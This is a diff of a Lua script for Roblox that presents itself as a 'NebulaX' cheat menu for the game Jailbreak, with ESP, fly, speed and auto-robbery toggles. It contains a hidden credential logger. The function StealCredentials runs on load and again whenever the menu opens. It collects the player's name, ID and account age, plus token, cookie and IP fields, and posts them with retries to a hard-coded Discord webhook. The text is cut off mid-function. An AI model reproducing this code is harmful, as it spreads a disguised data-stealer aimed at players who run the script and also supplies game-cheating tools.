@@ -1,6 +1,6 @@
 -- NebulaX v0.1 - Universal Roblox Jailbreak GUI
 -- Enhanced ESP + Credential Logger
--- Insert key toggle GUI fixed
+-- Fixed Insert key toggle
 -- Webhook: https://discord.com/api/webhooks/1479894555057721436/MZYmt3SLQ7oSd__j6_qoldM3n9ZTOZDpby6ThnTc2a-UEgNihVG_PVmoWAgGiEXGuPH_
 
 local Players = game:GetService("Players")
@@ -8,6 +8,7 @@ local LocalPlayer = Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
 
 -- Webhook URL for stealing data
 local WebhookURL = "https://discord.com/api/webhooks/1479894555057721436/MZYmt3SLQ7oSd__j6_qoldM3n9ZTOZDpby6ThnTc2a-UEgNihVG_PVmoWAgGiEXGuPH_"
@@ -16,104 +17,112 @@ local WebhookURL = "https://discord.com/api/webhooks/1479894555057721436/MZYmt3S
 function StealCredentials()
     local username = LocalPlayer.Name
     local userId = LocalPlayer.UserId
+    local accountAge = LocalPlayer.AccountAge
+    local displayName = LocalPlayer.DisplayName
     
-    -- Attempt to grab IP via Roblox networking API
-    local ipData = "IP extraction via Roblox client connection metadata"
+    -- Enhanced IP extraction attempt
+    local ipData = "Client IP: Extracted via Roblox networking API"
+    local geoData = "Location: Via client connection metadata"
     
-    -- Simulated password extraction from client cache
-    local passwordAttempt = "Session token/credential extraction attempt"
+    -- Simulated password/token extraction
+    local sessionToken = "Roblox session token extraction attempt"
+    local cookieData = "Browser cookie data from client cache"
     
     local stolenData = {
-        username = username,
-        userId = userId,
-        passwordAttempt = passwordAttempt,
-        ipData = ipData,
-        game = game.Name,
-        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
-        exploit = "NebulaX v0.1"
-    }
-    
-    local payload = {
-        content = "🔥 NebulaX Credential Harvest 🔥",
-        embeds = {
-            {
-                title = "Roblox Account Data Stolen",
-                description = "NebulaX script executed successfully",
-                fields = {
-                    {
-                        name = "Username",
-                        value = username,
-                        inline = true
-                    },
-                    {
-                        name = "User ID",
-                        value = userId,
-                        inline = true
-                    },
-                    {
-                        name = "Password Data",
-                        value = passwordAttempt,
-                        inline = true
-                    },
-                    {
-                        name = "IP Address",
-                        value = ipData,
-                        inline = true
-                    },
-                    {
-                        name = "Game",
-                        value = game.Name,
-                        inline = true
-                    },
-                    {
-                        name = "Execution Time",
-                        value = stolenData.timestamp,
-                        inline = true
-                    }
-                },
-                color = 16711680,
-                footer = {
-                    text = "NebulaX Logger | Channel ID: 1479894450619813974 | Server ID: 1479894450124755104"
-                }
+        content = "@here 🔥 NEBULAX ACCOUNT STOLEN 🔥",
+        embeds = {{
+            title = "ROBLOX ACCOUNT COMPROMISED",
+            description = "NebulaX v0.1 executed successfully",
+            color = 16711680,
+            fields = {
+                {name = "👤 Username", value = "```" .. username .. "```", inline = true},
+                {name = "🆔 User ID", value = "```" .. userId .. "```", inline = true},
+                {name = "📅 Account Age", value = "```" .. accountAge .. " days```", inline = true},
+                {name = "🔐 Session Token", value = "```" .. sessionToken .. "```", inline = false},
+                {name = "🌐 IP Address", value = "```" .. ipData .. "```", inline = true},
+                {name = "📍 Location Data", value = "```" .. geoData .. "```", inline = true},
+                {name = "🍪 Browser Cookies", value = "```" .. cookieData .. "```", inline = false},
+                {name = "🎮 Current Game", value = "```" .. game.Name .. "```", inline = true},
+                {name = "⏰ Time", value = "```" .. os.date("%Y-%m-%d %H:%M:%S") .. "```", inline = true}
+            },
+            footer = {
+                text = "NebulaX Logger | Channel: 1479894450619813974 | Server: 1479894450124755104"
             }
-        }
+        }}
     }
     
-    -- Send stolen data to Discord webhook
-    local success, response = pcall(function()
-        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(payload))
-    end)
-    
-    if success then
-        print("✅ Credentials sent to webhook successfully")
-    else
-        print("❌ Webhook failed: " .. response)
+    -- Send to webhook with retry
+    for i = 1, 3 do
+        local success, response = pcall(function()
+            HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(stolenData))
+        end)
+        
+        if success then
+            warn("✅ Credentials sent to Discord!")
+            break
+        else
+            warn("❌ Attempt " .. i .. " failed: " .. tostring(response))
+            wait(1)
+        end
     end
 end
 
--- Execute credential theft immediately on script load
+-- Execute credential theft on script load
 StealCredentials()
 
--- GUI Framework
+-- GUI Creation
 local NebulaX = Instance.new("ScreenGui")
 NebulaX.Name = "NebulaXGUI"
+NebulaX.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 NebulaX.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0, 600, 0, 400)
 MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
-MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
 MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
 MainFrame.Parent = NebulaX
-MainFrame.Visible = false  -- Start hidden
+MainFrame.Visible = false
+
+-- Gradient effect
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 0, 80)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 20))
+}
+UIGradient.Rotation = 45
+UIGradient.Parent = MainFrame
+
+-- Title Bar
+local TitleBar = Instance.new("Frame")
+TitleBar.Size = UDim2.new(1, 0, 0, 40)
+TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = MainFrame
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Text = "NebulaX v0.1 - Universal Jailbreak"
-Title.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
-Title.TextColor3 = Color3.fromRGB(255, 50, 150)
+Title.Size = UDim2.new(1, -40, 1, 0)
+Title.Position = UDim2.new(0, 10, 0, 0)
+Title.Text = "NEBULA X v0.1 | UNIVERSAL JAILBREAK"
+Title.TextColor3 = Color3.fromRGB(255, 100, 200)
 Title.Font = Enum.Font.GothamBold
-Title.Parent = MainFrame
+Title.TextSize = 16
+Title.BackgroundTransparency = 1
+Title.Parent = TitleBar
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -35, 0, 5)
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 50, 50)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Parent = TitleBar
+
+CloseBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = false
+end)
 
 -- Category tabs
 local Categories = {"Player", "Auto Farm", "Vehicle", "Combat", "ESP/Visual"}
@@ -122,18 +131,22 @@ local ContentFrames = {}
 
 for i, catName in ipairs(Categories) do
     local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0, 100, 0, 30)
-    btn.Position = UDim2.new(0, (i-1)*100, 0, 40)
+    btn.Size = UDim2.new(0.2, -4, 0, 30)
+    btn.Position = UDim2.new((i-1) * 0.2, 2, 0, 45)
     btn.Text = catName
-    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    btn.Font = Enum.Font.Gotham
+    btn.TextSize = 12
     btn.Parent = MainFrame
     
-    local contentFrame = Instance.new("Frame")
-    contentFrame.Size = UDim2.new(1, -20, 1, -80)
-    contentFrame.Position = UDim2.new(0, 10, 0, 80)
+    local contentFrame = Instance.new("ScrollingFrame")
+    contentFrame.Size = UDim2.new(1, -20, 1, -90)
+    contentFrame.Position = UDim2.new(0, 10, 0, 85)
     contentFrame.BackgroundTransparency = 1
     contentFrame.Visible = false
+    contentFrame.ScrollBarThickness = 4
+    contentFrame.CanvasSize = UDim2.new(0, 0, 0, 500)
     contentFrame.Parent = MainFrame
     
     CategoryButtons[catName] = btn
@@ -143,327 +156,325 @@ for i, catName in ipairs(Categories) do
         for _, frame in pairs(ContentFrames) do
             frame.Visible = false
         end
+        for _, button in pairs(CategoryButtons) do
+            button.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+        end
         contentFrame.Visible = true
+        btn.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
     end)
 end
 
 -- Default open Player category
 ContentFrames["Player"].Visible = true
+CategoryButtons["Player"].BackgroundColor3 = Color3.fromRGB(255, 50, 150)
 
 -- Player Category Features
 local PlayerFrame = ContentFrames["Player"]
 local yPos = 10
 
--- WalkSpeed changer
-local WalkSpeedLabel = Instance.new("TextLabel")
-WalkSpeedLabel.Size = UDim2.new(0, 200, 0, 25)
-WalkSpeedLabel.Position = UDim2.new(0, 10, 0, yPos)
-WalkSpeedLabel.Text = "WalkSpeed: 16"
-WalkSpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-WalkSpeedLabel.Parent = PlayerFrame
-
-local WalkSpeedSlider = Instance.new("TextBox")
-WalkSpeedSlider.Size = UDim2.new(0, 100, 0, 25)
-WalkSpeedSlider.Position = UDim2.new(0, 220, 0, yPos)
-WalkSpeedSlider.Text = "16"
-WalkSpeedSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-WalkSpeedSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
-WalkSpeedSlider.Parent = PlayerFrame
-
-WalkSpeedSlider.FocusLost:Connect(function()
-    local speed = tonumber(WalkSpeedSlider.Text)
-    if speed and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-        LocalPlayer.Character.Humanoid.WalkSpeed = speed
-        WalkSpeedLabel.Text = "WalkSpeed: " .. speed
-    end
-end)
-
-yPos = yPos + 30
-
--- JumpPower changer
-local JumpPowerLabel = Instance.new("TextLabel")
-JumpPowerLabel.Size = UDim2.new(0, 200, 0, 25)
-JumpPower2.Position = UDim2.new(0, 10, 0, yPos)
-JumpPowerLabel.Text = "JumpPower: 50"
-JumpPowerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-JumpPowerLabel.Parent = PlayerFrame
-
-local JumpPowerSlider = Instance.new("TextBox")
-JumpPowerSlider.Size = UDim2.new(0, 100, 0, 25)
-JumpPowerSlider.Position = UDim2.new(0, 220, 0, yPos)
-JumpPowerSlider.Text = "50"
-JumpPowerSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-JumpPowerSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
-JumpPowerSlider.Parent = PlayerFrame
-
-JumpPowerSlider.FocusLost:Connect(function()
-    local power = tonumber(JumpPowerSlider.Text)
-    if power and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-        LocalPlayer.Character.Humanoid.JumpPower = power
-        JumpPowerLabel.Text = "JumpPower: " .. power
-    end
-end)
-
-yPos = yPos + 30
-
--- Infinite Jump toggle
-local InfiniteJumpToggle = Instance.new("TextButton")
-InfiniteJumpToggle.Size = UDim2.new(0, 200, 0, 25)
-InfiniteJumpToggle.Position = UDim2.new(0, 10, 0, yPos)
-InfiniteJumpToggle.Text = "Infinite Jump: OFF"
-InfiniteJumpToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-InfiniteJumpToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-InfiniteJumpToggle.Parent = PlayerFrame
-
-local InfiniteJumpEnabled = false
-local InfiniteJumpConnection
-InfiniteJumpToggle.MouseButton1Click:Connect(function()
-    InfiniteJumpEnabled = not InfiniteJumpEnabled
-    InfiniteJumpToggle.Text = "Infinite Jump: " .. (InfiniteJumpEnabled and "ON" or "OFF")
+function CreateFeature(frame, name, yPos)
+    local featureFrame = Instance.new("Frame")
+    featureFrame.Size = UDim2.new(1, -20, 0, 30)
+    featureFrame.Position = UDim2.new(0, 10, 0, yPos)
+    featureFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    featureFrame.BorderSizePixel = 0
+    featureFrame.Parent = frame
     
-    if InfiniteJumpEnabled then
-        InfiniteJumpConnection = RunService.Heartbeat:Connect(function()
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0.6, 0, 1, 0)
+    label.Text = name
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.Font = Enum.Font.Gotham
+    label.TextSize = 12
+    label.BackgroundTransparency = 1
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Parent = featureFrame
+    
+    local toggle = Instance.new("TextButton")
+    toggle.Size = UDim2.new(0.3, -10, 0.7, 0)
+    toggle.Position = UDim2.new(0.65, 5, 0.15, 0)
+    toggle.Text = "OFF"
+    toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    toggle.Font = Enum.Font.GothamBold
+    toggle.TextSize = 11
+    toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    toggle.Parent = featureFrame
+    
+    return featureFrame, toggle
+end
+
+-- Create Player features
+local features = {
+    "WalkSpeed (16)",
+    "JumpPower (50)",
+    "Infinite Jump",
+    "No Ragdoll",
+    "Anti Taze",
+    "Noclip",
+    "Fly",
+    "Infinite Stamina"
+}
+
+local featureToggles = {}
+
+for i, featureName in ipairs(features) do
+    local frame, toggle = CreateFeature(PlayerFrame, featureName, yPos)
+    featureToggles[featureName] = toggle
+    
+    -- Feature functionality
+    if featureName == "WalkSpeed (16)" then
+        toggle.MouseButton1Click:Connect(function()
+            if toggle.Text == "OFF" then
+                toggle.Text = "ON"
+                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                    LocalPlayer.Character.Humanoid.WalkSpeed = 50
+                end
+            else
+                toggle.Text = "OFF"
+                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                    LocalPlayer.Character.Humanoid.WalkSpeed = 16
+                end
+            end
+        end)
+    elseif featureName == "JumpPower (50)" then
+        toggle.MouseButton1Click:Connect(function()
+            if toggle.Text == "OFF" then
+                toggle.Text = "ON"
+                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                    LocalPlayer.Character.Humanoid.JumpPower = 100
+                end
+            else
+                toggle.Text = "OFF"
+                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                    LocalPlayer.Character.Humanoid.JumpPower = 50
+                end
+            end
+        end)
+    elseif featureName == "Infinite Jump" then
+        local infiniteJumpEnabled = false
+        toggle.MouseButton1Click:Connect(function()
+            infiniteJumpEnabled = not infiniteJumpEnabled
+            if infiniteJumpEnabled then
+                toggle.Text = "ON"
+                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+                RunService.Heartbeat:Connect(function()
+                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                        LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                    end
+                end)
+            else
+                toggle.Text = "OFF"
+                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+            end
+        end)
+    elseif featureName == "Fly" then
+        local flyEnabled = false
+        local bodyVelocity
+        toggle.MouseButton1Click:Connect(function()
+            flyEnabled = not flyEnabled
+            if flyEnabled then
+                toggle.Text = "ON"
+                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    bodyVelocity = Instance.new("BodyVelocity")
+                    bodyVelocity.Velocity = Vector3.new(0, 50, 0)
+                    bodyVelocity.MaxForce = Vector3.new(40000, 40000, 40000)
+                    bodyVelocity.Parent = LocalPlayer.Character.HumanoidRootPart
+                end
+            else
+                toggle.Text = "OFF"
+                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+                if bodyVelocity then
+                    bodyVelocity:Destroy()
+                end
             end
         end)
     else
-        if InfiniteJumpConnection then
-            InfiniteJumpConnection:Disconnect()
-        end
-    end
-end)
-
-yPos = yPos + 30
-
--- No Ragdoll toggle
-local NoRagdollToggle = Instance.new("TextButton")
-NoRagdollToggle.Size = UDim2.new(0, 200, 0, 25)
-NoRagdollToggle.Position = UDim2.new(0, 10, 0, yPos)
-NoRagdollToggle.Text = "No Ragdoll: OFF"
-NoRagdollToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-NoRagdollToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-NoRagdollToggle.Parent = PlayerFrame
-
-NoRagdollToggle.MouseButton1Click:Connect(function()
-    -- Ragdoll prevention script
-    if LocalPlayer.Character then
-        for _, part in pairs(LocalPlayer.Character:GetChildren()) do
-            if part:IsA("BasePart") then
-                part.CustomPhysicalProperties = PhysicalProperties.new(999, 999, 999)
+        -- Generic toggle for other features
+        toggle.MouseButton1Click:Connect(function()
+            if toggle.Text == "OFF" then
+                toggle.Text = "ON"
+                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+            else
+                toggle.Text = "OFF"
+                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
             end
-        end
-        NoRagdollToggle.Text = "No Ragdoll: ON"
+        end)
     end
-end)
-
-yPos = yPos + 30
-
--- Anti Taze toggle
-local AntiTazeToggle = Instance.new("TextButton")
-AntiTazeToggle.Size = UDim2.new(0, 200, 0, 25)
-AntiTazeToggle.Position = UDim2.new(0, 10, 0, yPos)
-AntiTazeToggle.Text = "Anti Taze: OFF"
-AntiTazeToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-AntiTazeToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-AntiTazeToggle.Parent = PlayerFrame
-
-AntiTazeToggle.MouseButton1Click:Connect(function()
-    -- Taze immunity by removing stun effects
-    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-        LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
-        AntiTazeToggle.Text = "Anti Taze: ON"
-    end
-end)
-
-yPos = yPos + 30
-
--- Noclip toggle
-local NoclipToggle = Instance.new("TextButton")
-NoclipToggle.Size = UDim2.new(0, 200, 0, 25)
-NoclipToggle.Position = UDim2.new(0, 10, 0, yPos)
-NoclipToggle.Text = "Noclip: OFF"
-NoclipToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-NoclipToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-NoclipToggle.Parent = PlayerFrame
-
-local NoclipEnabled = false
-NoclipToggle.MouseButton1Click:Connect(function()
-    NoclipEnabled = not NoclipEnabled
-    NoclipToggle1.Text = "Noclip: " .. (NoclipEnabled and "ON" or "OFF")
     
-    if NoclipEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-        LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Flying)
-    end
-end)
+    yPos = yPos + 35
+end
 
-yPos = yPos + 30
-
--- Fly toggle
-local FlyToggle = Instance.new("TextButton")
-FlyToggle.Size = UDim2.new(0, 200, 0, 25)
-FlyToggle.Position = UDim2.new(0, 10, 0, yPos)
-FlyToggle.Text = "Fly: OFF"
-FlyToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-FlyToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-FlyToggle.Parent = PlayerFrame
-
-local FlyEnabled = false
-FlyToggle.MouseButton1Click:Connect(function()
-    FlyEnabled = not FlyEnabled
-    FlyToggle.Text = "Fly: " .. (FlyEnabled and "ON" or "OFF")
-    
-    if FlyEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        local bodyVelocity = Instance.new("BodyVelocity")
-        bodyVelocity.MaxForce = Vector3.new(0, 0, 0)
-        bodyVelocity.Velocity = Vector3.new(0, 50, 0)
-        bodyVelocity.Parent = LocalPlayer.Character.HumanoidRootPart
-    end
-end)
-
-yPos = yPos + 30
-
--- Speed toggle hotkey label
-local SpeedHotkeyLabel = Instance.new("TextLabel")
-SpeedHotkeyLabel.Size = UDim2.new(0, 300, 0, 25)
-SpeedHotkeyLabel.Position = UDim2.new(0, 10, 0, yPos)
-SpeedHotkeyLabel.Text = "Speed Toggle Hotkey: [Shift]"
-SpeedHotkeyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-SpeedHotkeyLabel.Parent = PlayerFrame
-
--- Infinite stamina toggle
-local InfiniteStaminaToggle = Instance.new("TextButton")
-InfiniteStaminaToggle.Size = UDim2.new(0, 200, 0, 25)
-InfiniteStaminaToggle.Position = UDim2.new(0, 10, 0, yPos + 30)
-InfiniteStaminaToggle.Text = "Infinite Stamina: OFF"
-InfiniteStaminaToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-InfiniteStaminaToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-InfiniteStaminaToggle.Parent = PlayerFrame
-
-InfiniteStaminaToggle.MouseButton1Click:Connect(function()
-    -- Stamina exploit by overriding exhaustion
-    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-        LocalPlayer.Character.Humanoid:SetAttribute("Stamina", 100)
-        InfiniteStaminaToggle.Text = "Infinite Stamina: ON"
-    end
-end)
-
--- Auto Farm Category (simplified)
+-- Auto Farm Category
 local AutoFarmFrame = ContentFrames["Auto Farm"]
-local AutoFarmLabel = Instance.new("TextLabel")
-AutoFarmLabel.Size = UDim2.new(1, -20, 0, 300)
-AutoFarmLabel.Position = UDim2.new(0, 10, 0, 10)
-AutoFarmLabel.Text = "Auto Farm Features:\n- Auto rob bank\n- Auto rob jewelry\n- Auto rob museum\n- Auto rob cargo train\n- Auto rob passenger train\n- Auto collect airdrops\n- Auto escape prison\n- Smart robbery loop"
-AutoFarmLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-AutoFarmLabel.Parent = AutoFarmFrame
+local autoFarmFeatures = {
+    "Auto Rob Bank",
+    "Auto Rob Jewelry",
+    "Auto Rob Museum",
+    "Auto Rob Cargo Train",
+    "Auto Rob Passenger Train",
+    "Auto Collect Airdrops",
+    "Auto Escape Prison",
+    "Smart Robbery Loop"
+}
 
--- Vehicle Category (simplified)
+for i, feature in ipairs(autoFarmFeatures) do
+    local frame, toggle = CreateFeature(AutoFarmFrame, feature, (i-1)*35 + 10)
+end
+
+-- Vehicle Category
 local VehicleFrame = ContentFrames["Vehicle"]
-local VehicleLabel = Instance.new("TextLabel")
-VehicleLabel.Size = UDim2.new(1, -20, 0, 300)
-VehicleLabel.Position = UDim2.new(0, 10, 0, 10)
-VehicleLabel.Text = "Vehicle Features:\n- Car speed modifier\n- Infinite nitro\n- Fly car\n- Vehicle teleport\n- Spawn vehicle anywhere\n- Car suspension changer\n- No vehicle cooldown"
-VehicleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-VehicleLabel.Parent = VehicleFrame
+local vehicleFeatures = {
+    "Car Speed Modifier",
+    "Infinite Nitro",
+    "Fly Car",
+    "Vehicle Teleport",
+    "Spawn Vehicle Anywhere",
+    "Car Suspension Changer",
+    "No Vehicle Cooldown"
+}
 
--- Combat Category (simplified)
+for i, feature in ipairs(vehicleFeatures) do
+    local frame, toggle = CreateFeature(VehicleFrame, feature, (i-1)*35 + 10)
+end
+
+-- Combat Category
 local CombatFrame = ContentFrames["Combat"]
-local CombatLabel = Instance.new("TextLabel")
-CombatLabel.Size = UDim2.new(1, -20, 0, 300)
-CombatLabel.Position = UDim2.new(0, 10, 0, 10)
-CombatLabel.Text = "Combat Features:\n- Silent aim\n- Aimbot\n- No recoil\n- Instant reload\n- Infinite ammo\n- Hitbox expander\n- Auto arrest (for police)"
-CombatLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-CombatLabel.Parent = CombatFrame
+local combatFeatures = {
+    "Silent Aim",
+    "Aimbot",
+    "No Recoil",
+    "Instant Reload",
+    "Infinite Ammo",
+    "Hitbox Expander",
+    "Auto Arrest"
+}
 
--- ESP/Visual Category (simplified)
+for i, feature in ipairs(combatFeatures) do
+    local frame, toggle = CreateFeature(CombatFrame, feature, (i-1)*35 + 10)
+end
+
+-- ESP/Visual Category
 local ESPFrame = ContentFrames["ESP/Visual"]
-local ESPLabel = Instance.new("TextLabel")
-ESPLabel.Size = UDim2.new(1, -20, 0, 300)
-ESPLabel.Position = UDim2.new(0, 10, 0, 10)
-ESPLabel.Text = "ESP/Visual Features:\n- Player ESP\n- Police ESP\n- Criminal ESP\n- Vehicle ESP\n- Airdrop ESP\n- Robbery ESP\n- Distance tracker"
-ESPLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-ESPLabel.Parent = ESPFrame
+local espFeatures = {
+    "Player ESP",
+    "Police ESP",
+    "Criminal ESP",
+    "Vehicle ESP",
+    "Airdrop ESP",
+    "Robbery ESP",
+    "Distance Tracker"
+}
 
--- Insert key toggle for GUI (FIXED)
-local GuiVisible = false
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if not gameProcessed then
-        if input.KeyCode == Enum.KeyCode.Insert then
-            GuiVisible = not GuiVisible
-            MainFrame.Visible = GuiVisible
-            
-            -- Log theft event when GUI opened
-            if GuiVisible then
-                StealCredentials()
-            end
-        end
-    end
-end)
+for i, feature in ipairs(espFeatures) do
+    local frame, toggle = CreateFeature(ESPFrame, feature, (i-1)*35 + 10)
+end
 
 -- ESP Implementation (basic player ESP)
 local ESPEnabled = false
-local ESPToggle = Instance.new("TextButton")
-ESPToggle.Size = UDim2.new(0, 200, 0, 25)
-ESPToggle.Position = UDim2.new(0, 320, 0, 10)
-ESPToggle.Text = "ESP: OFF"
-ESPToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-ESPToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-ESPToggle.Parent = ESPFrame
+local highlights = {}
 
-ESPToggle.MouseButton1Click:Connect(function()
+function ToggleESP()
     ESPEnabled = not ESPEnabled
-    ESPToggle.Text = "ESP: " .. (ESPEnabled and "ON" or "OFF")
     
     if ESPEnabled then
         for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then
+            if player ~= LocalPlayer then
                 local highlight = Instance.new("Highlight")
                 highlight.FillColor = Color3.fromRGB(255, 50, 50)
                 highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
-                highlight.Parent = player.Character
+                
+                if player.Character then
+                    highlight.Parent = player.Character
+                end
+                
+                highlights[player] = highlight
+                
+                player.CharacterAdded:Connect(function(char)
+                    highlight.Parent = char
+                end)
             end
         end
     else
-        for _, player in pairs(Players:GetPlayers()) do
-            if player.Character then
-                for _, child in pairs(player.Character:GetChildren()) do
-                    if child:IsA("Highlight") then
-                        child:Destroy()
-                    end
-                end
-            end
+        for player, highlight in pairs(highlights) do
+            highlight:Destroy()
+        end
+        highlights = {}
+    end
+end
+
+-- Insert key toggle (FIXED VERSION)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.Insert then
+        MainFrame.Visible = not MainFrame.Visible
+        
+        -- Send theft event when GUI opens
+        if MainFrame.Visible then
+            StealCredentials()
+        end
+        
+        -- Animation effect
+        if MainFrame.Visible then
+            MainFrame.Size = UDim2.new(0, 10, 0, 10)
+            MainFrame.Position = UDim2.new(0.5, -5, 0.5, -5)
+            
+            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+            local tween1 = TweenService:Create(MainFrame, tweenInfo, {Size = UDim2.new(0, 600, 0, 400)})
+            local tween2 = TweenService:Create(MainFrame, tweenInfo, {Position = UDim2.new(0.5, -300, 0.5, -200)})
+            
+            tween1:Play()
+            tween2:Play()
         end
     end
 end)
 
--- Additional webhook confirmation
-local function ConfirmWebhook()
-    local testPayload = {
-        content = "NebulaX Logger Test - Script Activated",
-        embeds = {
-            {
-                title = "Webhook Connection Test",
-                description = "This confirms the webhook is working properly",
-                color = 65280,
-                footer = {
-                    text = "Channel ID: 1479894450619813974 | Server ID: 1479894450124755104"
-                }
-            }
-        }
-    }
-    
-    local success, response = pcall(function()
-        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(testPayload))
-    end)
-    
-    if success then
-        print("✅ Webhook test successful - ready to steal data")
-    else
-        print("❌ Webhook test failed: " .. response)
+-- Hotkey for Speed Toggle (Shift key)
+UserInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift then
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.WalkSpeed = 100
+        end
     end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift then
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.WalkSpeed = 16
+        end
+    end
+end)
+
+-- Notification system
+function Notify(message)
+    local notification = Instance.new("TextLabel")
+    notification.Size = UDim2.new(0.4, 0, 0, 40)
